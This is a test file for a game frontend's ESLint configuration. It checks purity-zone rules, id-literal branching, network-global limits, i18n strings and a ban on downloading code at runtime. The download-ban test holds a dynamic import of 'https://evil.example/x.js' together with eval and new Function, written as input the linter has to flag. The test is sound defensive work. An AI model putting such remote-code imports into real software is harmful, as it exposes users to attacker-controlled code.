import path from 'node:path';
import { ESLint } from 'eslint';
import tseslint from 'typescript-eslint';
import { beforeAll, describe, expect, it } from 'vitest';
import {
  downloadBanBlock,
  i18nextJsxBlock,
  networkGlobalsBlock,
  purityZoneBlock,
} from './eslint-rules.ts';

const FRONTEND_ROOT = path.resolve(import.meta.dirname, '..');

// Non-type-aware instance: purity/i18next rules are purely syntactic, so
// lintText works on virtual file paths without touching the filesystem.
let eslint: ESLint;

beforeAll(() => {
  eslint = new ESLint({
    cwd: FRONTEND_ROOT,
    overrideConfigFile: true,
    overrideConfig: [
      {
        languageOptions: {
          parser: tseslint.parser,
          parserOptions: { ecmaFeatures: { jsx: true } },
        },
        plugins: { '@typescript-eslint': tseslint.plugin },
      },
      purityZoneBlock,
      downloadBanBlock,
      networkGlobalsBlock,
      i18nextJsxBlock,
    ],
  });
});

async function ruleIdsFor(filePath: string, code: string): Promise<string[]> {
  const [result] = await eslint.lintText(code, { filePath });
  return (result?.messages ?? [])
    .map((message) => message.ruleId)
    .filter((ruleId): ruleId is string => ruleId !== null);
}

const PURITY_ZONES = [
  'src/core/x.ts',
  'src/kernel/x.ts',
  'src/content/x.ts',
  'src/protocol/x.ts',
  'src/features/alpha/sim/x.ts',
  'src/features/alpha/rules/x.ts',
  'src/modes/m1/x.ts',
  'src/modes/m1/sim/x.ts',
  'src/features/alpha/content.ts',
  'src/features/alpha/protocol.ts',
];

describe('purity zones', () => {
  it.each(PURITY_ZONES)('flags forbidden Math and globals in %s', async (filePath) => {
    const code = [
      'export const f = () => {',
      '  const a = Math.random();',
      '  const b = Math.pow(2, 3);',
      '  const c = Math.sin(1) + Math.atan2(1, 2);',
      '  const d = Date.now();',
      '  const e = performance.now();',
      '  return a + b + c + d + e;',
      '};',
    ].join('\n');
    const ruleIds = await ruleIdsFor(filePath, code);
    expect(ruleIds).toContain('no-restricted-properties');
    expect(ruleIds).toContain('no-restricted-globals');
  });

  it.each(PURITY_ZONES)('flags the ** operator in %s', async (filePath) => {
    const ruleIds = await ruleIdsFor(
      filePath,
      'export const x = 2 ** 3;\nlet y = 1;\ny **= 2;\nexport { y };\n',
    );
    expect(ruleIds).toContain('no-restricted-syntax');
  });

  it.each(PURITY_ZONES)('allows Math.sqrt in %s', async (filePath) => {
    const ruleIds = await ruleIdsFor(filePath, 'export const x = Math.sqrt(4);\n');
    expect(ruleIds).not.toContain('no-restricted-properties');
  });

  it('does not flag the same code outside purity zones', async () => {
    const ruleIds = await ruleIdsFor(
      'src/client/x.ts',
      'export const x = Math.random() + Math.sin(1) + Date.now() + 2 ** 3;\n',
    );
    expect(ruleIds).not.toContain('no-restricted-properties');
    expect(ruleIds).not.toContain('no-restricted-globals');
    expect(ruleIds).not.toContain('no-restricted-syntax');
  });

  it('does not flag modes ui code', async () => {
    const ruleIds = await ruleIdsFor(
      'src/modes/m1/ui/x.ts',
      'export const x = Math.random() + Date.now();\n',
    );
    expect(ruleIds).not.toContain('no-restricted-properties');
    expect(ruleIds).not.toContain('no-restricted-globals');
  });
});

describe('content/mode id literals', () => {
  it.each(PURITY_ZONES)('flags id-literal branching in %s', async (filePath) => {
    const code = [
      "export const f = (id: string) => id === 'frontline_td:rifle';",
      'export const g = (id: string) => {',
      '  switch (id) {',
      "    case 'frontline_td:railgun':",
      '      return 1;',
      '    default:',
      '      return 0;',
      '  }',
      '};',
    ].join('\n');
    const ruleIds = await ruleIdsFor(filePath, code);
    expect(ruleIds).toContain('no-restricted-syntax');
  });

  it('does not flag id definitions or non-branching literals', async () => {
    const code = [
      "export const CMD = 'frontline_td:rally';",
      "export const id: string = 'frontline_td:rally';",
      'export const set = new Set([CMD]);',
    ].join('\n');
    const ruleIds = await ruleIdsFor('src/core/x.ts', code);
    expect(ruleIds).not.toContain('no-restricted-syntax');
  });

  it('does not flag id literals outside purity zones', async () => {
    const ruleIds = await ruleIdsFor(
      'src/client/x.ts',
      "export const f = (id: string) => id === 'frontline_td:rally';\n",
    );
    expect(ruleIds).not.toContain('no-restricted-syntax');
  });
});

describe('runtime code download ban', () => {
  it.each(['src/client/x.ts', 'src/app/x.ts', 'src/core/x.ts'])(
    'flags eval/new Function/dynamic imports in %s',
    async (filePath) => {
      const ruleIds = await ruleIdsFor(
        filePath,
        [
          "export const a = eval('1');",
          'export const b = new Function("x", "return x");',
          'export async function c(m: string) { return import(m); }',
          'export async function d() { return import("https://evil.example/x.js"); }',
        ].join('\n'),
      );
      expect(ruleIds).toContain('no-eval');
      expect(ruleIds).toContain('no-new-func');
      expect(ruleIds).toContain('no-restricted-syntax');
    },
  );

  it('allows a static literal relative import()', async () => {
    const ruleIds = await ruleIdsFor(
      'src/client/x.ts',
      'export async function c() { return import("./y.js"); }\n',
    );
    expect(ruleIds).not.toContain('no-restricted-syntax');
  });
});

describe('network globals', () => {
  it('flags fetch/WebSocket outside host/', async () => {
    const ruleIds = await ruleIdsFor(
      'src/client/net.ts',
      'export const f = () => { fetch("/x"); return new WebSocket("wss://x"); };\n',
    );
    expect(ruleIds).toContain('no-restricted-globals');
  });

  it('allows network globals inside host/', async () => {
    const ruleIds = await ruleIdsFor(
      'src/host/net.ts',
      'export const f = () => { fetch("/x"); return new WebSocket("wss://x"); };\n',
    );
    expect(ruleIds).not.toContain('no-restricted-globals');
  });
});

describe('i18next literal strings', () => {
  it('flags a JSX literal in a .tsx file', async () => {
    const code = 'const c = () => <p>Hello world</p>;\nexport default c;\n';
    const ruleIds = await ruleIdsFor('src/x.tsx', code);
    expect(ruleIds).toContain('i18next/no-literal-string');
  });
});
